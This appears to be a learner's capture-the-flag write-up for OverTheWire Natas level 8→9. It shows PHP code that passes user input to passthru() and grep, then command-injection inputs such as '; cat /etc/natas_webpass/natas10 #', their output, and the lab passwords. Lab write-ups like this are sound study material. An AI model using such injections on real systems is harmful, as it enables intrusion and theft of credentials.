# Natas Level 8 → Level 9 Command Injection

## Previous Flag
<b>ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t</b>

## Goal
Username: natas9<br>
URL: http://natas9.natas.labs.overthewire.org<br>

Find words containing: <br>
Output:<br>
View sourcecode

## What I learned
```
passthru() has no checking input
Forms need to be check before press submit or very vulnerable
SQL injection   1=1, ' OR 1=1 -- are different than Command Injection
```

## Solution
```
Click View source code
http://natas9.natas.labs.overthewire.org/index-source.html

<div id="content">
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>

Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt"); 👀
}
?>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>

http://natas9.natas.labs.overthewire.org/dictionary.txt             # Nothing useful

Find words containing: ; ls -la;
Output:
total 476
drwxr-x---  2 natas9 natas9   4096 Jul 28 18:49 .
drwxr-xr-x 38 root   root     4096 Jul 28 18:49 ..
-rw-r-----  1 natas9 natas9    117 Jul 28 18:49 .htaccess
-rw-r-----  1 natas9 natas9     45 Jul 28 18:49 .htpasswd
-rw-r-----  1 natas9 natas9 460878 Jul 28 18:49 dictionary.txt
-rw-r--r--  1 root   root     2924 Jul 28 18:49 index-source.html
-rw-r-----  1 natas9 natas9   1185 Jul 28 18:49 index.php
Find words containing: ; cat /etc/natas_webpass/natas10 #
Output:
t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu 🔐
Find words containing: ; cat /etc/natas_webpass/natas10;
Output:
t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu 🔐
```

## Flag
<b>t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu</b>

## Continue
[Continue](/overthewire/Natas0910.md)